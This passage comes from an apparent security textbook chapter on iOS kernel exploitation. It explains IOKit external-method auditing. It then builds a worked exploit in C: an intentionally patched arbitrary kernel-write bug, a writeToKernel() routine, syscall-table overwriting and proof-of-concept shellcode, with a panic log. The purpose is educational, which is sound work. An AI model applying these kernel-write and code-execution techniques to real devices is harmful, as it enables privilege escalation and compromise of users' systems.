external method within modern code. It is through the IOConnectCallMethod()
function:
kern_return_t
IOConnectCallMethod(
mach_port_t connection, // In
uint32_t selector, // In
const uint64_t *input, // In
uint32_t inputCnt, // In
const void *inputStruct, // In
size_t inputStructCnt, // In
uint64_t *output, // Out
uint32_t *outputCnt, // In/Out
void *outputStruct, // Out
size_t *outputStructCnt) // In/Out
AVAILABLE_MAC_OS_X_VERSION_10_5_AND_LATER;
The function is called with a lot of parameters to allow a broad usage. The
fi rst two arguments defi ne the connection to the driver and the numerical
index of the function called. The following four arguments describe the input
parameters to the external method, and the remaining four arguments describe
the possible output parameters. For input and output, there are two types of
arguments each: scalar and structure. Scalar parameters are just 64-bit integers,
and structure parameters are arbitrary data structures in a format known only
to the kernel driver and its user space client. There can be multiple scalar input
and output parameters, but only one structure as input and output, and you
must submit the size of the structure.
At the kernel level, IOKit drivers can implement external methods, by choos-
ing to overwrite several different methods of the IOUserClient class. The
most general method that can be overwritten is the ExternalMethod()
cc0099..iinndddd 226677 44//1166//22001122 55::4477::0088 PPMM
268 Chapter 9 n Kernel Debugging and Exploitation
method. This method is not only responsible for finding the selected
external method, but it also checks the supplied parameters against the
requirements, calls the actual method, and handles the output in the cor-
rect way. User clients that completely overwrite this method have to ensure
to pass execution to the parent method or implement everything on their
own, which can be the cause of lots of security problems. Therefore, the
overwritten ExternalMethod() methods should be carefully audited. A
more convenient way to implement this is to overwrite one of the helper
methods used by the base implementation. These helper methods are
getAsyncTargetAndMethodForIndex(), getExternalMethodForIndex(),
getExternalAsyncMethodForIndex(), and getTargetAndMethodForIndex().
Each of these methods is supposed to look up the external method by index
and optionally determine the target object. No matter what function the
user client implementation overwrites, you have to check that they validate
the index and that an illegal index does not lead to arbitrary lookups in
attacker-controlled memory pages. And again, the actual external methods
have to be audited for the usual security problems arising from putting too
much trust into function arguments.
While reversing the IOKit drivers within the kernelcache and looking for
IOKit-related vulnerabilities, the scripts within the idaios toolkit, combined
with the new IDA 6.2 list fi ltering feature, will come in very handy, as demon-
strated in Figure 9-5.
Figure 9.5: IDA Filtering IOKit Drivers
cc0099..iinndddd 226688 44//1166//22001122 55::4477::0088 PPMM
Chapter 9 n Kernel Debugging and Exploitation 269
Kernel Exploitation
This section discusses the exploitation of four very common vulnerability
classes you face in kernel exploitation. It explains the involved vulnerabilities
in detail and shows how exploits can be built for each of them. The discussion
contains C code snippets of the original exploits used. It is, however, important
to realize that since the introduction of the iOS 4.3 kernel, no known shortcuts
exist to disable the code-signing functionality, even as the root user. In versions
prior to iOS 4.3, it was possible for the root user to disable the security.mac
.proc_enforce and security.mac.vnode_enforce sysctl entries from user
space. This would disable several security checks in the code-signing function-
ality and allow the user to launch kernel exploits from an incorrectly signed
Mach-O binary. But with the introduction of iOS 4.3, these sysctl entries were
made read-only. Therefore, all kernel exploits for more recent versions of iOS
have to be implemented as 100 percent return oriented programming (ROP)
payloads, unless they are launched from within a process that has dynamic
code-signing capabilities. Launching kernel exploits as a non-root user always
had this requirement.
Arbitrary Memory Overwrite
Exploiting an arbitrary kernel memory overwrite vulnerability allows you to
write anything you want anywhere within the kernel’s address space. Although
vulnerabilities like this have been found and fi xed in the past, this example
doesn’t exploit a real vulnerability, but instead shows you how to patch the
kernel and introduces an artifi cial vulnerability. But, before you can do this you
need a kernel binary with the jailbreaking kernel patches already applied. The
easiest way to create this is to use the kernel patch generator by comex. You can
fi nd it on Github at http://github.com/comex/datautils0. Once compiled, it
provides two utilities that you can use to create a jailbroken kernel. We will
not go into the actual kernel patches it provides at this point, because this is
discussed in Chapter 10.
$ ./make_kernel_patchfile kernelcache.iPod4,1_4.3.5_8L1.decrypted
mykernelpatchfile
$ ./apply_patchfile kernelcache.iPod4,1_4.3.5_8L1.decrypted \
mykernelpatchfile kernelcache.iPod4,1_4.3.5_8L1.patched
vm_map_enter (0x80043fc8)
vm_map_protect (0x8004115e)
AMFI (0x80618394)
-debug_enabled initializer (0x80204d9c)
task_for_pid 0 (0x801a7df6)
cs_enforcement_disable (0x8027eb5c)
proc_enforce (0x8029c1e4)
cc0099..iinndddd 226699 44//1166//22001122 55::4477::0088 PPMM
270 Chapter 9 n Kernel Debugging and Exploitation
USB power (0x805eab92)
sb_evaluate hook (0x8061b6d4)
sb_evaluate (0x80938e9c)
Patching a Vulnerability into the Kernel
Now that you have a jailbroken kernel binary you can add your own vulner-
ability into it. To do this you have to fi nd and replace the following bytes in
the kernel binary:
Original 68 46 10 22 F7 F6 26 EC F3 E7 00 BF
Patched 68 46 10 22 F7 F6 70 EE 00 20 F2 E7
You then use the redsn0w utility from the iPhone Dev Team to boot the patched
kernel:
$ ./redsn0w -j -k kernelcache.iPod4,1_4.3.5_8L1.patched -a “-v”
Before you continue, take a look at the patch you applied and how the intro-
duced vulnerability looks. The code you patched is within the getrlimit()
system call. Within the system call handler, you can fi nd the following code
near the end that uses the copyout() function to copy the result back into user
space. The copyout() function is responsible for checking that the destination
address is actually within user space memory so that one cannot write the result
into kernel memory. The disassembly of the original code is:
80175628 MOV R0, SP
8017562A MOVS R2, #0x10
8017562C BLX _copyout
80175630 B loc_8017561A
The applied patch changes the call of copyout() into a call of ovbcopy(),
which does not perform any checks and therefore allows a target address to
be specifi ed anywhere within kernel memory. In addition to that, the applied
patch clears the R0 register to signal a successful copy operation, which looks
in assembly like this:
80175628 MOV R0, SP
8017562A MOVS R2, #0x10
8017562C BLX _ovbcopy
80175630 MOVS R0, #0
80175632 B loc_8017561A
This means you can write the result of the getrlimit() system call to kernel
memory, by using a pointer to kernel memory as second parameter:
getrlimit(RLIMIT_CORE, 0x80101010);
cc0099..iinndddd 227700 44//1166//22001122 55::4477::0088 PPMM
Chapter 9 n Kernel Debugging and Exploitation 271
Because this vulnerability allows you to write an rlimit structure anywhere
in kernel memory, you have to look into its defi nition:
struct rlimit {
rlim_t rlim_cur; /* current (soft) limit */
rlim_t rlim_max; /* hard limit */
};
Within iOS, the data-type rlim_t is a 64-bit unsigned integer, but only 63 of its
bits are used. The highest bit is supposed to be zero. Therefore, only the fi rst
seven bytes of the result can be arbitrarily chosen. This is not a problem, because
you can perform the exploit repeatedly. There is also the restriction that the
value of rlim_cur is not allowed to be greater than rlim_max. This means your
exploit code needs to use a resource limit that is initially set to infi nity (all 63
bits set), because otherwise not all seven bytes can be written. In the case of
RLIMIT_CORE, this is the default. So to write the bytes 11 22 33 44 55 66 77
to the kernel, you have to do something like this:
getrlimit(RLIMIT_CORE, &rlp);
rlp.rlim_cur = 0x77665544332211;
setrlimit(RLIMIT_CORE, &rlp);
getrlimit(RLIMIT_CORE, 0x80101010);
To write an arbitrary amount of data to the kernel, you can wrap this exploit
into a function that repeatedly uses the vulnerability:
void writeToKernel(unsigned char *addr, unsigned char *buffer,
size_t len)
{
struct rlimit rlp;
getrlimit(RLIMIT_CORE, &rlp);
while (len > 7) {
memcpy(&rlp, buffer, 7);
setrlimit(RLIMIT_CORE, &rlp);
getrlimit(RLIMIT_CORE, addr);
len -= 7; buffer += 7; addr += 7;
}
memcpy(&rlp, buffer, len);
setrlimit(RLIMIT_CORE, &rlp);
getrlimit(RLIMIT_CORE, addr);
}
Choosing a Target to Overwrite
Once you can write anything, you need to decide what you should overwrite.
Historically, this has been used in Mac OS X kernel exploits to overwrite the
processes’ user credentials inside kernel memory to leverage its privileges. For
cc0099..iinndddd 227711 44//1166//22001122 55::4477::0088 PPMM
272 Chapter 9 n Kernel Debugging and Exploitation
iOS and newer Mac OS X kernels, this is no longer suffi cient, because you often
have to deal with kernel-level sandboxing. Just changing the process’s user ID
to zero will not be enough to gain full access to the system. Instead, you always
have to go for arbitrary code execution inside the kernel. To achieve this you
need to overwrite a kernel-level function pointer or saved return address and
redirect the kernel’s execution path to your own code.
One way to do this is to overwrite one of the unused system call handlers
in the system call table and then trigger the execution from user space by call-
ing the system call in question. iOS contains quite a lot of unused system call
table entries. The kernel exploits for jailbreaking the iPhone have used the table
entries 0 and 207 before, without running into trouble from other software.
The second problem you have to solve in your exploit is to introduce code into
the kernel to which you can jump. You have many different ways to solve this,
and several of them are discussed in the remaining sections. This example
employs a specifi c attack that can be used when you can write anything anywhere
in kernel memory. You overwrite the executable and writable slack space in
kernel memory with your code. Such unused space you can fi nd, for example, in
the . . . Each contained kernel extension comes with a Mach-O header and has some
unused space between the end of the header and the beginning of the next
segment.
For this exploit it means you have to know the exact location of the system call
table and the slack space in kernel memory. Because there is no ASLR protection at
the kernel level, these addresses are static for the same device and kernel version
and have to be found only once for all the released fi rmware builds. To cover all
versions of iOS 4, without support for AppleTV, you have up to 81 different pos-
sible addresses. However, some of these addresses will be the same because, on the
one hand, not every iOS version introduces (bigger) changes in the kernel and, on
the other hand, the main kernel code segment is byte identical for devices of the
same processor type. Therefore you can write a script for fi nding the addresses
for all available kernels and create a lookup table for your kernel exploit.
Locating the System Call Table
Locating the system call table has become more diffi cult in recent kernel updates,
because Apple has moved some kernel symbols around and removed others
completely. Previously you could use symbols like kdebug_enable to locate
the table easily. A new method for locating the table relies on the structure of
the fi rst entry and its relative position to the nsysent variable. An entry in the
system call table is called sysent:
struct sysent { /* system call table */
int16_t sy_narg; /* number of args */
int8_t sy_resv; /* reserved */
cc0099..iinndddd 227722 44//1166//22001122 55::4477::0088 PPMM
Chapter 9 n Kernel Debugging and Exploitation 273
int8_t sy_flags; /* flags */
sy_call_t *sy_call; /* implementing function */
sy_munge_t *sy_arg_munge32; /* syscall arguments munger for 32-bit */
sy_munge_t *sy_arg_munge64; /* syscall arguments munger for 64-bit */
int32_t sy_return_type; /* system call return types */
uint16_t sy_arg_bytes; /* Total size of arguments in bytes for
* 32-bit system calls
*/
};
Because the fi rst entry of the system call table is not actually an implemented
system call, most of its structure elements are initialized to zero. The only fi elds
set are the sy_return_type and sy_call elements. The return type is initial-
ized to the value 1 and the handler is some pointer into the code segment of the
kernel. In addition to that you know that the system call table is located within
the data segment of the kernel. You can therefore scan the data segment for
data that matches the defi nition of the fi rst entry. To verify that you found the
table, you can use the fact that the nsysent variable is stored directly behind
the table. This means you start by choosing a guessed number of system calls,
and check if the formula &nsysent = &sysent + sizeof(sysent) * nsysent
validates. If not, you keep increasing, until you reach a high number, and have
to assume that your guessed address for sysent was wrong. In this case, you
have to continue searching within the data segment for the real fi rst entry.
The idaiostoolkit contains a script that automates this search and also uses
the syscalls.master fi le from the XNU source code to set all the symbols and
function types for the system call handlers. The following is the script’s output
for the example iOS 4.3.5 fi rmware for iPod4:
Found syscall table _sysent at 802926e8
Number of entries in syscall table _nsysent = 438
Syscall number count _nsysent is at 80294ff8
Constructing the Exploit
Finding a suitable slack space is much easier, because you just have to check
the __PRELINK_TEXT segment for empty space after a MACH-O header of one
of the kernel extensions. A suitable gap with a size of 3328 bytes is the memory
between 0x8032B300 and 0x8032C000. You can use this within your exploit.
char shellcode[] = “\x01\x20\x02\x21\x03\x22\x04\x23\xFF\xFF”;
struct sysent scentry;
unsigned char * syscall207 = 0x802926e8 + 207 * sizeof(scentry);
unsigned char * slackspace = 0x8032B300;
memset(&scentry, 0, sizeof(scentry));
scentry.sy_call = slackspace + 1;
cc0099..iinndddd 227733 44//1166//22001122 55::4477::0088 PPMM
274 Chapter 9 n Kernel Debugging and Exploitation
scentry.sy_return_type = 1;
writeToKernel(slackspace, &shellcode, sizeof(shellcode));
writeToKernel(syscall207, &scentry, sizeof(scentry));
syscall(207);
The shellcode in this exploit is simple thumb code that just moves some values
into the registers R0-R3 and then panics due to an undefi ned instruction. This is
merely to prove that some kind of execution occurred. Full kernel-level payloads
are discussed in Chapter 10.
MOVS R0, #1
MOVS R1, #2
MOVS R2, #3
MOVS R3, #4
UNDEFINED
When your exploit is executed it causes a kernel panic, and the paniclog shows
that your code was executed and the registers fi lled accordingly. The program
counter PC shows a crash occurred when an undefi ned kernel instruction from
within the slack space was executed and the value of R5 hints to the execution
of syscall handler 207.
panic(cpu 0 caller 0x8006fcf8): undefined kernel instruction
r0: 0x00000001 r1: 0x00000002 r2: 0x00000003 r3: 0x00000004
r4: 0x856e02e0 r5: 0x000000cf r6: 0xc0a886ac r7: 0xcd273fa8
r8: 0x00000001 r9: 0xc0a884b0 r10: 0x80293a50 r11: 0x832b8244
12: 0x00000000 sp: 0xcd273f90 lr: 0x801a96e8 pc: 0x8032b308
cpsr: 0x20000033 fsr: 0x856e02e0 far: 0xcd273fa8
This should be enough to show how easy it is to achieve arbitrary kernel code
execution if you are able to write directly into kernel memory. The exploit gets
harder if the vulnerability does not allow you to write whatever you want, but
limits the possible values to write. However, the vulnerability discussed in the